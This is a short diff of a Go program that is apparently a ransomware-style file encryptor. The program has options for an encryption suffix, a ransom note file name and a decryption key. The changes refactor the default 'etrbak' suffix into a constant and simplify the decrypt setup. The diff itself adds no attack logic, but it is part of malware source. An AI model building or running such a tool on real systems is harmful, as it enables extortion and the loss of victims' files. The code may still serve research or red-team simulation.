@@ -19,13 +19,13 @@ import (
 	"regexp"
 	"strings"
 	"time"
-
-	"golang.org/x/crypto/nacl/secretbox"
 )
 
 var (
 	domain = "example.com" /* Default DNS domain for key. */
 )
+
+const defaultEncSuffix = "etrbak"
 
 func main() {
 	start := time.Now()
@@ -37,7 +37,7 @@ func main() {
 		)
 		encSuffix = flag.String(
 			"encryption-suffix",
-			"etrbak",
+			defaultEncSuffix,
 			"Backup `suffix` to use when encrypting files",
 		)
 		ransomNoteName = flag.String(
@@ -103,6 +103,12 @@ Options:
 		}
 	}
 
+	/* Make sure we have a backup suffix. */
+	if "" == *encSuffix {
+		*encSuffix = defaultEncSuffix
+		log.Printf("Using default backup suffix %q", *encSuffix)
+	}
+
 	/* Work out whether we're encrypting or decrypting */
 	var wf filepath.WalkFunc
 	if "" != *decryptKey {
@@ -110,10 +116,7 @@ Options:
 			Key: KeyFromString(
 				strings.Trim(*decryptKey, " ."),
 			),
-			Buffer: make(
-				[]byte,
-				*chunkLen+24+secretbox.Overhead,
-			),
+			BackupSuffix: *encSuffix,
 		}.Decrypt
 	} else {
 		var ID string
